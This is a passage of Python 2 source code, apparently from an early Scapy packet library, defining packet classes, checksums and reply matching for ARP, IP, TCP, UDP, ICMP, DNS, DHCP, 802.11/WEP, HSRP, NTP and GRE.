        return chr(self.type)+self.payload.hashret()
    def answers(self, other):
        if isinstance(other,EAPOL):
            if ( (self.type == self.EAP_PACKET) and
                 (other.type == self.EAP_PACKET) ):
                return self.payload.answers(other.payload)
        return 0
    def mysummary(self):
        return self.sprintf("EAPOL %EAPOL.type%")


class EAP(Packet):
    name = "EAP"
    fields_desc = [ ByteEnumField("code", 4, {1:"REQUEST",2:"RESPONSE",3:"SUCCESS",4:"FAILURE"}),
                    ByteField("id", 0),
                    ShortField("len",None),
                    ConditionalField(ByteEnumField("type",0, {1:"ID",4:"MD5"}), lambda pkt:pkt.code not in [EAP.SUCCESS, EAP.FAILURE])

                                     ]

    REQUEST = 1
    RESPONSE = 2
    SUCCESS = 3
    FAILURE = 4
    TYPE_ID = 1
    TYPE_MD5 = 4
    def answers(self, other):
        if isinstance(other,EAP):
            if self.code == self.REQUEST:
                return 0
            elif self.code == self.RESPONSE:
                if ( (other.code == self.REQUEST) and
                     (other.type == self.type) ):
                    return 1
            elif other.code == self.RESPONSE:
                return 1
        return 0

    def post_build(self, p, pay):
        if self.len is None:
            l = len(p)+len(pay)
            p = p[:2]+chr((l>>8)&0xff)+chr(l&0xff)+p[4:]
        return p+pay


class ARP(Packet):
    name = "ARP"
    fields_desc = [ XShortField("hwtype", 0x0001),
                    XShortEnumField("ptype",  0x0800, ETHER_TYPES),
                    ByteField("hwlen", 6),
                    ByteField("plen", 4),
                    ShortEnumField("op", 1, {"who-has":1, "is-at":2, "RARP-req":3, "RARP-rep":4, "Dyn-RARP-req":5, "Dyn-RAR-rep":6, "Dyn-RARP-err":7, "InARP-req":8, "InARP-rep":9}),
                    ARPSourceMACField("hwsrc"),
                    SourceIPField("psrc","pdst"),
                    MACField("hwdst", ETHER_ANY),
                    IPField("pdst", "0.0.0.0") ]
    who_has = 1
    is_at = 2
    def answers(self, other):
        if isinstance(other,ARP):
            if ( (self.op == self.is_at) and
                 (other.op == self.who_has) and
                 (self.psrc == other.pdst) ):
                return 1
        return 0
    def extract_padding(self, s):
        return "",s
    def mysummary(self):
        if self.op == self.is_at:
            return "ARP is at %s says %s" % (self.hwsrc, self.psrc)
        elif self.op == self.who_has:
            return "ARP who has %s says %s" % (self.pdst, self.psrc)
        else:
            return "ARP %ARP.op% %ARP.psrc% > %ARP.pdst%"


class IP(Packet, IPTools):
    name = "IP"
    fields_desc = [ BitField("version" , 4 , 4),
                    BitField("ihl", None, 4),
                    XByteField("tos", 0),
                    ShortField("len", None),
                    ShortField("id", 1),
                    FlagsField("flags", 0, 3, ["MF","DF","evil"]),
                    BitField("frag", 0, 13),
                    ByteField("ttl", 64),
                    ByteEnumField("proto", 0, IP_PROTOS),
                    XShortField("chksum", None),
                    #IPField("src", "127.0.0.1"),
                    Emph(SourceIPField("src","dst")),
                    Emph(IPField("dst", "127.0.0.1")),
                    IPoptionsField("options", "") ]
    def post_build(self, p, pay):
        ihl = self.ihl
        if ihl is None:
            ihl = len(p)/4
            p = chr(((self.version&0xf)<<4) | ihl&0x0f)+p[1:]
        if self.len is None:
            l = len(p)+len(pay)
            p = p[:2]+struct.pack("!H", l)+p[4:]
        if self.chksum is None:
            ck = checksum(p)
            p = p[:10]+chr(ck>>8)+chr(ck&0xff)+p[12:]
        return p+pay

    def extract_padding(self, s):
        l = self.len - (self.ihl << 2)
        return s[:l],s[l:]

    def send(self, s, slp=0):
        for p in self:
            try:
                s.sendto(str(p), (p.dst,0))
            except socket.error, msg:
                log_runtime.error(msg)
            if slp:
                time.sleep(slp)
    def hashret(self):
        if ( (self.proto == socket.IPPROTO_ICMP)
             and (isinstance(self.payload, ICMP))
             and (self.payload.type in [3,4,5,11,12]) ):
            return self.payload.payload.hashret()
        else:
            if conf.checkIPsrc and conf.checkIPaddr:
                return strxor(inet_aton(self.src),inet_aton(self.dst))+struct.pack("B",self.proto)+self.payload.hashret()
            else:
                return struct.pack("B", self.proto)+self.payload.hashret()
    def answers(self, other):
        if not isinstance(other,IP):
            return 0
        if conf.checkIPaddr and (self.dst != other.src):
            return 0
        if ( (self.proto == socket.IPPROTO_ICMP) and
             (isinstance(self.payload, ICMP)) and
             (self.payload.type in [3,4,5,11,12]) ):
            # ICMP error message
            return self.payload.payload.answers(other)

        else:
            if ( (conf.checkIPaddr and (self.src != other.dst)) or
                 (self.proto != other.proto) ):
                return 0
            return self.payload.answers(other.payload)
    def mysummary(self):
        s = self.sprintf("%IP.src% > %IP.dst% %IP.proto%")
        if self.frag:
            s += " frag:%i" % self.frag
        return s



class TCP(Packet):
    name = "TCP"
    fields_desc = [ ShortEnumField("sport", 20, TCP_SERVICES),
                    ShortEnumField("dport", 80, TCP_SERVICES),
                    IntField("seq", 0),
                    IntField("ack", 0),
                    BitField("dataofs", None, 4),
                    BitField("reserved", 0, 4),
                    FlagsField("flags", 0x2, 8, "FSRPAUEC"),
                    ShortField("window", 8192),
                    XShortField("chksum", None),
                    ShortField("urgptr", 0),
                    TCPOptionsField("options", {}) ]
    def post_build(self, p, pay):
        p += pay
        dataofs = self.dataofs
        if dataofs is None:
            dataofs = 5+((len(self.get_field("options").i2m(self,self.options))+3)/4)
            p = p[:12]+chr((dataofs << 4) | ord(p[12])&0x0f)+p[13:]
        if self.chksum is None:
            if isinstance(self.underlayer, IP):
                if self.underlayer.len is not None:
                    ln = self.underlayer.len-20
                else:
                    ln = len(p)
                psdhdr = struct.pack("!4s4sHH",
                                     inet_aton(self.underlayer.src),
                                     inet_aton(self.underlayer.dst),
                                     self.underlayer.proto,
                                     ln)
                ck=checksum(psdhdr+p)
                p = p[:16]+struct.pack("!H", ck)+p[18:]
            elif isinstance(self.underlayer, IPv6) or isinstance(self.underlayer, _IPv6OptionHeader):
                ck = in6_chksum(socket.IPPROTO_TCP, self.underlayer, p)
                p = p[:16]+struct.pack("!H", ck)+p[18:]
            else:
                warning("No IP underlayer to compute checksum. Leaving null.")
        return p
    def hashret(self):
        if conf.checkIPsrc:
            return struct.pack("H",self.sport ^ self.dport)+self.payload.hashret()
        else:
            return self.payload.hashret()
    def answers(self, other):
        if not isinstance(other, TCP):
            return 0
        if conf.checkIPsrc:
            if not ((self.sport == other.dport) and
                    (self.dport == other.sport)):
                return 0
        if (abs(other.seq-self.ack) > 2+len(other.payload)):
            return 0
        return 1
    def mysummary(self):
        if isinstance(self.underlayer, IP):
            return self.underlayer.sprintf("TCP %IP.src%:%TCP.sport% > %IP.dst%:%TCP.dport% %TCP.flags%")
        elif isinstance(self.underlayer, IPv6):
            return self.underlayer.sprintf("TCP %IPv6.src%:%TCP.sport% > %IPv6.dst%:%TCP.dport% %TCP.flags%")
        else:
            return self.sprintf("TCP %TCP.sport% > %TCP.dport% %TCP.flags%")

class UDP(Packet):
    name = "UDP"
    fields_desc = [ ShortEnumField("sport", 53, UDP_SERVICES),
                    ShortEnumField("dport", 53, UDP_SERVICES),
                    ShortField("len", None),
                    XShortField("chksum", None), ]
    def post_build(self, p, pay):
        p += pay
        l = self.len
        if l is None:
            l = len(p)
            p = p[:4]+struct.pack("!H",l)+p[6:]
        if self.chksum is None:
            if isinstance(self.underlayer, IP):
                if self.underlayer.len is not None:
                    ln = self.underlayer.len-20
                else:
                    ln = len(p)
                psdhdr = struct.pack("!4s4sHH",
                                     inet_aton(self.underlayer.src),
                                     inet_aton(self.underlayer.dst),
                                     self.underlayer.proto,
                                     ln)
                ck=checksum(psdhdr+p)
                p = p[:6]+struct.pack("!H", ck)+p[8:]
            elif isinstance(self.underlayer, IPv6) or isinstance(self.underlayer, _IPv6OptionHeader):
                ck = in6_chksum(socket.IPPROTO_UDP, self.underlayer, p)
                p = p[:6]+struct.pack("!H", ck)+p[8:]
            else:
                warning("No IP underlayer to compute checksum. Leaving null.")
        return p
    def extract_padding(self, s):
        l = self.len - 8
        return s[:l],s[l:]
    def hashret(self):
        return self.payload.hashret()
    def answers(self, other):
        if not isinstance(other, UDP):
            return 0
        if conf.checkIPsrc:
            if self.dport != other.sport:
                return 0
        return self.payload.answers(other.payload)
    def mysummary(self):
        if isinstance(self.underlayer, IP):
            return self.underlayer.sprintf("UDP %IP.src%:%UDP.sport% > %IP.dst%:%UDP.dport%")
        elif isinstance(self.underlayer, IPv6):
            return self.underlayer.sprintf("UDP %IPv6.src%:%UDP.sport% > %IPv6.dst%:%UDP.dport%")
        else:
            return self.sprintf("UDP %UDP.sport% > %UDP.dport%")

icmptypes = { 0 : "echo-reply",
              3 : "dest-unreach",
              4 : "source-quench",
              5 : "redirect",
              8 : "echo-request",
              9 : "router-advertisement",
              10 : "router-solicitation",
              11 : "time-exceeded",
              12 : "parameter-problem",
              13 : "timestamp-request",
              14 : "timestamp-reply",
              15 : "information-request",
              16 : "information-response",
              17 : "address-mask-request",
              18 : "address-mask-reply" }

class ICMP(Packet):
    name = "ICMP"
    fields_desc = [ ByteEnumField("type",8, icmptypes),
                    ByteField("code",0),
                    XShortField("chksum", None),
                    XShortField("id",0),
                    XShortField("seq",0) ]
    def post_build(self, p, pay):
        p += pay
        if self.chksum is None:
            ck = checksum(p)
            p = p[:2]+chr(ck>>8)+chr(ck&0xff)+p[4:]
        return p

    def hashret(self):
        return struct.pack("HH",self.id,self.seq)+self.payload.hashret()
    def answers(self, other):
        if not isinstance(other,ICMP):
            return 0
        if ( (other.type,self.type) in [(8,0),(13,14),(15,16),(17,18)] and
             self.id == other.id and
             self.seq == other.seq ):
            return 1
        return 0

    def guess_payload_class(self, payload):
        if self.type in [3,4,5,11,12]:
            return IPerror
        else:
            return None
    def mysummary(self):
        if isinstance(self.underlayer, IP):
            return self.underlayer.sprintf("ICMP %IP.src% > %IP.dst% %ICMP.type% %ICMP.code%")
        else:
            return self.sprintf("ICMP %ICMP.type% %ICMP.code%")





class IPerror(IP):
    name = "IP in ICMP"
    def answers(self, other):
        if not isinstance(other, IP):
            return 0
        if not ( ((conf.checkIPsrc == 0) or (self.dst == other.dst)) and
                 (self.src == other.src) and
                 ( ((conf.checkIPID == 0)
                    or (self.id == other.id)
                    or (conf.checkIPID == 1 and self.id == socket.htons(other.id)))) and
                 (self.proto == other.proto) ):
            return 0
        return self.payload.answers(other.payload)
    def mysummary(self):
        return Packet.mysummary(self)


class TCPerror(TCP):
    name = "TCP in ICMP"
    def answers(self, other):
        if not isinstance(other, TCP):
            return 0
        if conf.checkIPsrc:
            if not ((self.sport == other.sport) and
                    (self.dport == other.dport)):
                return 0
        if conf.check_TCPerror_seqack:
            if self.seq is not None:
                if self.seq != other.seq:
                    return 0
            if self.ack is not None:
                if self.ack != other.ack:
                    return 0
        return 1
    def mysummary(self):
        return Packet.mysummary(self)


class UDPerror(UDP):
    name = "UDP in ICMP"
    def answers(self, other):
        if not isinstance(other, UDP):
            return 0
        if conf.checkIPsrc:
            if not ((self.sport == other.sport) and
                    (self.dport == other.dport)):
                return 0
        return 1
    def mysummary(self):
        return Packet.mysummary(self)



class ICMPerror(ICMP):
    name = "ICMP in ICMP"
    def answers(self, other):
        if not isinstance(other,ICMP):
            return 0
        if not ((self.type == other.type) and
                (self.code == other.code)):
            return 0
        if self.code in [0,8,13,14,17,18]:
            if (self.id == other.id and
                self.seq == other.seq):
                return 1
            else:
                return 0
        else:
            return 1
    def mysummary(self):
        return Packet.mysummary(self)

class IPv6(Packet):
    """See http://namabiiru.hongo.wide.ad.jp/scapy6"""
    name = "IPv6 not implemented here."
    def __init__(self, *args, **kargs):
        log_interactive.error(self.name)
    def __repr__(self):
        return "<IPv6: ERROR not implemented>"

class _IPv6OptionHeader(Packet):
    """See http://namabiiru.hongo.wide.ad.jp/scapy6"""
    name = "IPv6 not implemented here."
    def __init__(self, *args, **kargs):
        log_interactive.error(self.name)
    def __repr__(self):
        return "<IPv6: ERROR not implemented>"

class PPP(Packet):
    name = "PPP Link Layer"
    fields_desc = [ ShortEnumField("proto", 0x0021, {0x0021: "IP",
                                                     0xc021: "LCP"} ) ]


class DNS(Packet):
    name = "DNS"
    fields_desc = [ ShortField("id",0),
                    BitField("qr",0, 1),
                    BitEnumField("opcode", 0, 4, {0:"QUERY",1:"IQUERY",2:"STATUS"}),
                    BitField("aa", 0, 1),
                    BitField("tc", 0, 1),
                    BitField("rd", 0, 1),
                    BitField("ra", 0 ,1),
                    BitField("z", 0, 3),
                    BitEnumField("rcode", 0, 4, {0:"ok", 1:"format-error", 2:"server-failure", 3:"name-error", 4:"not-implemented", 5:"refused"}),
                    DNSRRCountField("qdcount", None, "qd"),
                    DNSRRCountField("ancount", None, "an"),
                    DNSRRCountField("nscount", None, "ns"),
                    DNSRRCountField("arcount", None, "ar"),
                    DNSQRField("qd", "qdcount"),
                    DNSRRField("an", "ancount"),
                    DNSRRField("ns", "nscount"),
                    DNSRRField("ar", "arcount",0) ]
    def answers(self, other):
        return (isinstance(other, DNS)
                and self.id == other.id
                and self.qr == 1
                and other.qr == 0)

    def mysummary(self):
        type = ["Qry","Ans"][self.qr]
        name = ""
        if self.qr:
            type = "Ans"
            if self.ancount > 0 and isinstance(self.an, DNSRR):
                name = ' "%s"' % self.an.rdata
        else:
            type = "Qry"
            if self.qdcount > 0 and isinstance(self.qd, DNSQR):
                name = ' "%s"' % self.qd.qname
        return 'DNS %s%s ' % (type, name)

dnstypes = { 0:"ANY", 255:"ALL",
             1:"A", 2:"NS", 3:"MD", 4:"MD", 5:"CNAME", 6:"SOA", 7: "MB", 8:"MG",
             9:"MR",10:"NULL",11:"WKS",12:"PTR",13:"HINFO",14:"MINFO",15:"MX",16:"TXT",
             17:"RP",18:"AFSDB",28:"AAAA", 33:"SRV",38:"A6",39:"DNAME"}

dnsqtypes = {251:"IXFR",252:"AXFR",253:"MAILB",254:"MAILA",255:"ALL"}
dnsqtypes.update(dnstypes)
dnsclasses =  {1: 'IN',  2: 'CS',  3: 'CH',  4: 'HS',  255: 'ANY'}


class DNSQR(Packet):
    name = "DNS Question Record"
    show_indent=0
    fields_desc = [ DNSStrField("qname",""),
                    ShortEnumField("qtype", 1, dnsqtypes),
                    ShortEnumField("qclass", 1, dnsclasses) ]



class DNSRR(Packet):
    name = "DNS Resource Record"
    show_indent=0
    fields_desc = [ DNSStrField("rrname",""),
                    ShortEnumField("type", 1, dnstypes),
                    ShortEnumField("rclass", 1, dnsclasses),
                    IntField("ttl", 0),
                    RDLenField("rdlen"),
                    RDataField("rdata", "", length_from=lambda pkt:pkt.rdlen) ]

dhcpmagic="c\x82Sc"


class BOOTP(Packet):
    name = "BOOTP"
    fields_desc = [ ByteEnumField("op",1, {1:"BOOTREQUEST", 2:"BOOTREPLY"}),
                    ByteField("htype",1),
                    ByteField("hlen",6),
                    ByteField("hops",0),
                    IntField("xid",0),
                    ShortField("secs",0),
                    FlagsField("flags", 0, 16, "???????????????B"),
                    IPField("ciaddr","0.0.0.0"),
                    IPField("yiaddr","0.0.0.0"),
                    IPField("siaddr","0.0.0.0"),
                    IPField("giaddr","0.0.0.0"),
                    Field("chaddr","", "16s"),
                    Field("sname","","64s"),
                    Field("file","","128s"),
                    StrField("options","") ]
    def guess_payload_class(self, payload):
        if self.options[:len(dhcpmagic)] == dhcpmagic:
            return DHCP
        else:
            return Packet.guess_payload_class(self, payload)
    def extract_padding(self,s):
        if self.options[:len(dhcpmagic)] == dhcpmagic:
            # set BOOTP options to DHCP magic cookie and make rest a payload of DHCP options
            payload = self.options[len(dhcpmagic):]
            self.options = self.options[:len(dhcpmagic)]
            return payload, None
        else:
            return "", None
    def hashret(self):
        return struct.pack("L", self.xid)
    def answers(self, other):
        if not isinstance(other, BOOTP):
            return 0
        return self.xid == other.xid



#DHCP_UNKNOWN, DHCP_IP, DHCP_IPLIST, DHCP_TYPE \
#= range(4)
#

DHCPTypes = {
                1: "discover",
                2: "offer",
                3: "request",
                4: "decline",
                5: "ack",
                6: "nak",
                7: "release",
                8: "inform",
                9: "force_renew",
                10:"lease_query",
                11:"lease_unassigned",
                12:"lease_unknown",
                13:"lease_active",
                }

DHCPOptions = {
    0: "pad",
    1: IPField("subnet_mask", "0.0.0.0"),
    2: "time_zone",
    3: IPField("router","0.0.0.0"),
    4: IPField("time_server","0.0.0.0"),
    5: IPField("IEN_name_server","0.0.0.0"),
    6: IPField("name_server","0.0.0.0"),
    7: IPField("log_server","0.0.0.0"),
    8: IPField("cookie_server","0.0.0.0"),
    9: IPField("lpr_server","0.0.0.0"),
    12: "hostname",
    14: "dump_path",
    15: "domain",
    17: "root_disk_path",
    22: "max_dgram_reass_size",
    23: "default_ttl",
    24: "pmtu_timeout",
    28: IPField("broadcast_address","0.0.0.0"),
    35: "arp_cache_timeout",
    36: "ether_or_dot3",
    37: "tcp_ttl",
    38: "tcp_keepalive_interval",
    39: "tcp_keepalive_garbage",
    40: "NIS_domain",
    41: IPField("NIS_server","0.0.0.0"),
    42: IPField("NTP_server","0.0.0.0"),
    43: "vendor_specific",
    44: IPField("NetBIOS_server","0.0.0.0"),
    45: IPField("NetBIOS_dist_server","0.0.0.0"),
    50: IPField("requested_addr","0.0.0.0"),
    51: IntField("lease_time", 43200),
    54: IPField("server_id","0.0.0.0"),
    55: "param_req_list",
    57: ShortField("max_dhcp_size", 1500),
    58: IntField("renewal_time", 21600),
    59: IntField("rebinding_time", 37800),
    60: "vendor_class_id",
    61: "client_id",

    64: "NISplus_domain",
    65: IPField("NISplus_server","0.0.0.0"),
    69: IPField("SMTP_server","0.0.0.0"),
    70: IPField("POP3_server","0.0.0.0"),
    71: IPField("NNTP_server","0.0.0.0"),
    72: IPField("WWW_server","0.0.0.0"),
    73: IPField("Finger_server","0.0.0.0"),
    74: IPField("IRC_server","0.0.0.0"),
    75: IPField("StreetTalk_server","0.0.0.0"),
    76: "StreetTalk_Dir_Assistance",
    82: "relay_agent_Information",
    53: ByteEnumField("message-type", 1, DHCPTypes),
    #             55: DHCPRequestListField("request-list"),
    255: "end"
    }

DHCPRevOptions = {}

for k,v in DHCPOptions.iteritems():
    if type(v) is str:
        n = v
        v = None
    else:
        n = v.name
    DHCPRevOptions[n] = (k,v)
del(n)
del(v)
del(k)





class DHCPOptionsField(StrField):
    islist=1
    def i2repr(self,pkt,x):
        s = []
        for v in x:
            if type(v) is tuple and len(v) == 2:
                if  DHCPRevOptions.has_key(v[0]) and isinstance(DHCPRevOptions[v[0]][1],Field):
                    f = DHCPRevOptions[v[0]][1]
                    vv = f.i2repr(pkt,v[1])
                else:
                    vv = repr(v[1])
                s.append("%s=%s" % (v[0],vv))
            else:
                s.append(str(v))
        return "[%s]" % (" ".join(s))

    def getfield(self, pkt, s):
        return "", self.m2i(pkt, s)
    def m2i(self, pkt, x):
        opt = []
        while x:
            o = ord(x[0])
            if o == 255:
                opt.append("end")
                x = x[1:]
                continue
            if o == 0:
                opt.append("pad")
                x = x[1:]
                continue
            if DHCPOptions.has_key(o):
                f = DHCPOptions[o]

                if isinstance(f, str):
                    olen = ord(x[1])
                    opt.append( (f,x[2:olen+2]) )
                    x = x[olen+2:]
                else:
                    olen = ord(x[1])
                    left, val = f.getfield(pkt,x[2:olen+2])
#                    val = f.m2i(pkt,val)
#                    if left:
#                        print "m2i data left left=%s" % left
                    opt.append((f.name, val))
                    x = x[olen+2:]
            else:
                olen = ord(x[1])
                opt.append((o, x[2:olen+2]))
                x = x[olen+2:]
        return opt
    def i2m(self, pkt, x):
        #print "i2m x=%s" % x
        s = ""
        for o in x:
            if type(o) is tuple and len(o) == 2:
                name, val = o

                if isinstance(name, int):
                    onum, oval = name, val
                elif DHCPRevOptions.has_key(name):
                    onum, f = DHCPRevOptions[name]
                    if  f is None:
                        oval = val
                    else:
#                        oval = f.addfield(pkt,"",f.i2m(pkt,f.any2i(pkt,val)))
                        oval = f.addfield(pkt,"",f.any2i(pkt,val))

                else:
                    warning("Unknown field option %s" % name)
                    continue

                s += chr(onum)
                s += chr(len(oval))
                s += oval

            elif (type(o) is str and DHCPRevOptions.has_key(o) and
                  DHCPRevOptions[o][1] == None):
                s += chr(DHCPRevOptions[o][0])
            elif type(o) is int:
                s += chr(o)
            else:
                warning("Malformed option %s" % o)
        return s


class DHCP(Packet):
    name = "DHCP options"
    fields_desc = [ DHCPOptionsField("options","") ]


class Dot11(Packet):
    name = "802.11"
    fields_desc = [
                    BitField("subtype", 0, 4),
                    BitEnumField("type", 0, 2, ["Management", "Control", "Data", "Reserved"]),
                    BitField("proto", 0, 2),
                    FlagsField("FCfield", 0, 8, ["to-DS", "from-DS", "MF", "retry", "pw-mgt", "MD", "wep", "order"]),
                    ShortField("ID",0),
                    MACField("addr1", ETHER_ANY),
                    Dot11Addr2MACField("addr2", ETHER_ANY),
                    Dot11Addr3MACField("addr3", ETHER_ANY),
                    Dot11SCField("SC", 0),
                    Dot11Addr4MACField("addr4", ETHER_ANY)
                    ]
    def mysummary(self):
        return self.sprintf("802.11 %Dot11.type% %Dot11.subtype% %Dot11.addr2% > %Dot11.addr1%")
    def guess_payload_class(self, payload):
        if self.type == 0x02 and (self.subtype >= 0x08 and self.subtype <=0xF and self.subtype != 0xD):
            return Dot11QoS
        elif self.FCfield & 0x40:
            return Dot11WEP
        else:
            return Packet.guess_payload_class(self, payload)
    def answers(self, other):
        if isinstance(other,Dot11):
            if self.type == 0: # management
                if self.addr1.lower() != other.addr2.lower(): # check resp DA w/ req SA
                    return 0
                if (other.subtype,self.subtype) in [(0,1),(2,3),(4,5)]:
                    return 1
                if self.subtype == other.subtype == 11: # auth
                    return self.payload.answers(other.payload)
            elif self.type == 1: # control
                return 0
            elif self.type == 2: # data
                return self.payload.answers(other.payload)
            elif self.type == 3: # reserved
                return 0
        return 0
    def unwep(self, key=None, warn=1):
        if self.FCfield & 0x40 == 0:
            if warn:
                warning("No WEP to remove")
            return
        if  isinstance(self.payload.payload, NoPayload):
            if key or conf.wepkey:
                self.payload.decrypt(key)
            if isinstance(self.payload.payload, NoPayload):
                if warn:
                    warning("Dot11 can't be decrypted. Check conf.wepkey.")
                return
        self.FCfield &= ~0x40
        self.payload=self.payload.payload


class Dot11QoS(Packet):
    name = "802.11 QoS"
    fields_desc = [ BitField("TID",None,4),
                    BitField("EOSP",None,1),
                    BitField("Ack Policy",None,2),
                    BitField("Reserved",None,1),
                    ByteField("TXOP",None) ]
    def guess_payload_class(self, payload):
        if isinstance(self.underlayer, Dot11):
            if self.underlayer.FCfield & 0x40:
                return Dot11WEP
        return Packet.guess_payload_class(self, payload)


capability_list = [ "res8", "res9", "short-slot", "res11",
                    "res12", "DSSS-OFDM", "res14", "res15",
                   "ESS", "IBSS", "CFP", "CFP-req",
                   "privacy", "short-preamble", "PBCC", "agility"]

reason_code = {0:"reserved",1:"unspec", 2:"auth-expired",
               3:"deauth-ST-leaving",
               4:"inactivity", 5:"AP-full", 6:"class2-from-nonauth",
               7:"class3-from-nonass", 8:"disas-ST-leaving",
               9:"ST-not-auth"}

status_code = {0:"success", 1:"failure", 10:"cannot-support-all-cap",
               11:"inexist-asso", 12:"asso-denied", 13:"algo-unsupported",
               14:"bad-seq-num", 15:"challenge-failure",
               16:"timeout", 17:"AP-full",18:"rate-unsupported" }

class Dot11Beacon(Packet):
    name = "802.11 Beacon"
    fields_desc = [ LELongField("timestamp", 0),
                    LEShortField("beacon_interval", 0x0064),
                    FlagsField("cap", 0, 16, capability_list) ]


class Dot11Elt(Packet):
    name = "802.11 Information Element"
    fields_desc = [ ByteEnumField("ID", 0, {0:"SSID", 1:"Rates", 2: "FHset", 3:"DSset", 4:"CFset", 5:"TIM", 6:"IBSSset", 16:"challenge",
                                            42:"ERPinfo", 46:"QoS Capability", 47:"ERPinfo", 48:"RSNinfo", 50:"ESRates",221:"vendor",68:"reserved"}),
                    FieldLenField("len", None, "info", "B"),
                    StrLenField("info", "", length_from=lambda x:x.len) ]
    def mysummary(self):
        if self.ID == 0:
            return "SSID=%s"%repr(self.info),[Dot11]
        else:
            return ""

class Dot11ATIM(Packet):
    name = "802.11 ATIM"

class Dot11Disas(Packet):
    name = "802.11 Disassociation"
    fields_desc = [ LEShortEnumField("reason", 1, reason_code) ]

class Dot11AssoReq(Packet):
    name = "802.11 Association Request"
    fields_desc = [ FlagsField("cap", 0, 16, capability_list),
                    LEShortField("listen_interval", 0x00c8) ]


class Dot11AssoResp(Packet):
    name = "802.11 Association Response"
    fields_desc = [ FlagsField("cap", 0, 16, capability_list),
                    LEShortField("status", 0),
                    LEShortField("AID", 0) ]

class Dot11ReassoReq(Packet):
    name = "802.11 Reassociation Request"
    fields_desc = [ FlagsField("cap", 0, 16, capability_list),
                    MACField("current_AP", ETHER_ANY),
                    LEShortField("listen_interval", 0x00c8) ]


class Dot11ReassoResp(Dot11AssoResp):
    name = "802.11 Reassociation Response"

class Dot11ProbeReq(Packet):
    name = "802.11 Probe Request"

class Dot11ProbeResp(Packet):
    name = "802.11 Probe Response"
    fields_desc = [ LELongField("timestamp", 0),
                    LEShortField("beacon_interval", 0x0064),
                    FlagsField("cap", 0, 16, capability_list) ]

class Dot11Auth(Packet):
    name = "802.11 Authentication"
    fields_desc = [ LEShortEnumField("algo", 0, ["open", "sharedkey"]),
                    LEShortField("seqnum", 0),
                    LEShortEnumField("status", 0, status_code) ]
    def answers(self, other):
        if self.seqnum == other.seqnum+1:
            return 1
        return 0

class Dot11Deauth(Packet):
    name = "802.11 Deauthentication"
    fields_desc = [ LEShortEnumField("reason", 1, reason_code) ]



class Dot11WEP(Packet):
    name = "802.11 WEP packet"
    fields_desc = [ StrFixedLenField("iv", "\0\0\0", 3),
                    ByteField("keyid", 0),
                    StrField("wepdata",None,remain=4),
                    IntField("icv",None) ]

    def post_dissect(self, s):
#        self.icv, = struct.unpack("!I",self.wepdata[-4:])
#        self.wepdata = self.wepdata[:-4]
        self.decrypt()

    def build_payload(self):
        if self.wepdata is None:
            return Packet.build_payload(self)
        return ""

    def post_build(self, p, pay):
        if self.wepdata is None:
            key = conf.wepkey
            if key:
                if self.icv is None:
                    pay += struct.pack("<I",crc32(pay))
                    icv = ""
                else:
                    icv = p[4:8]
                c = ARC4.new(self.iv+key)
                p = p[:4]+c.encrypt(pay)+icv
            else:
                warning("No WEP key set (conf.wepkey).. strange results expected..")
        return p


    def decrypt(self,key=None):
        if key is None:
            key = conf.wepkey
        if key:
            c = ARC4.new(self.iv+key)
            self.add_payload(LLC(c.decrypt(self.wepdata)))



class PrismHeader(Packet):
    """ iwpriv wlan0 monitor 3 """
    name = "Prism header"
    fields_desc = [ LEIntField("msgcode",68),
                    LEIntField("len",144),
                    StrFixedLenField("dev","",16),
                    LEIntField("hosttime_did",0),
                  LEShortField("hosttime_status",0),
                  LEShortField("hosttime_len",0),
                    LEIntField("hosttime",0),
                    LEIntField("mactime_did",0),
                  LEShortField("mactime_status",0),
                  LEShortField("mactime_len",0),
                    LEIntField("mactime",0),
                    LEIntField("channel_did",0),
                  LEShortField("channel_status",0),
                  LEShortField("channel_len",0),
                    LEIntField("channel",0),
                    LEIntField("rssi_did",0),
                  LEShortField("rssi_status",0),
                  LEShortField("rssi_len",0),
                    LEIntField("rssi",0),
                    LEIntField("sq_did",0),
                  LEShortField("sq_status",0),
                  LEShortField("sq_len",0),
                    LEIntField("sq",0),
                    LEIntField("signal_did",0),
                  LEShortField("signal_status",0),
                  LEShortField("signal_len",0),
              LESignedIntField("signal",0),
                    LEIntField("noise_did",0),
                  LEShortField("noise_status",0),
                  LEShortField("noise_len",0),
                    LEIntField("noise",0),
                    LEIntField("rate_did",0),
                  LEShortField("rate_status",0),
                  LEShortField("rate_len",0),
                    LEIntField("rate",0),
                    LEIntField("istx_did",0),
                  LEShortField("istx_status",0),
                  LEShortField("istx_len",0),
                    LEIntField("istx",0),
                    LEIntField("frmlen_did",0),
                  LEShortField("frmlen_status",0),
                  LEShortField("frmlen_len",0),
                    LEIntField("frmlen",0),
                    ]
    def answers(self, other):
        if isinstance(other, PrismHeader):
            return self.payload.answers(other.payload)
        else:
            return self.payload.answers(other)



class HSRP(Packet):
    name = "HSRP"
    fields_desc = [
        ByteField("version", 0),
        ByteEnumField("opcode", 0, { 0:"Hello"}),
        ByteEnumField("state", 16, { 16:"Active"}),
        ByteField("hellotime", 3),
        ByteField("holdtime", 10),
        ByteField("priority", 120),
        ByteField("group", 1),
        ByteField("reserved", 0),
        StrFixedLenField("auth","cisco",8),
        IPField("virtualIP","192.168.1.1") ]







class NTP(Packet):
    # RFC 1769
    name = "NTP"
    fields_desc = [
         BitEnumField('leap', 0, 2,
                      { 0: 'nowarning',
                        1: 'longminute',
                        2: 'shortminute',
                        3: 'notsync'}),
         BitField('version', 3, 3),
         BitEnumField('mode', 3, 3,
                      { 0: 'reserved',
                        1: 'sym_active',
                        2: 'sym_passive',
                        3: 'client',
                        4: 'server',
                        5: 'broadcast',
                        6: 'control',
                        7: 'private'}),
         BitField('stratum', 2, 8),
         BitField('poll', 0xa, 8),          ### XXX : it's a signed int
         BitField('precision', 0, 8),       ### XXX : it's a signed int
         FloatField('delay', 0, 32),
         FloatField('dispersion', 0, 32),
         IPField('id', "127.0.0.1"),
         TimeStampField('ref', 0, 64),
         TimeStampField('orig', -1, 64),  # -1 means current time
         TimeStampField('recv', 0, 64),
         TimeStampField('sent', -1, 64)
         ]
    def mysummary(self):
        return self.sprintf("NTP v%ir,NTP.version%, %NTP.mode%")


class GRE(Packet):
    name = "GRE"
    fields_desc = [ BitField("chksumpresent",0,1),
                    BitField("reserved0",0,12),
                    BitField("version",0,3),
                    XShortEnumField("proto", 0x0000, ETHER_TYPES),
                    ConditionalField(XShortField("chksum",None),lambda pkt:pkt.chksumpresent==1),
                    ConditionalField(XShortField("reserved1",None),lambda pkt:pkt.chksumpresent==1),
                    ]
    def post_build(self, p, pay):
        p += pay
        if self.chksumpresent and self.chksum is None:
            c = checksum(p)
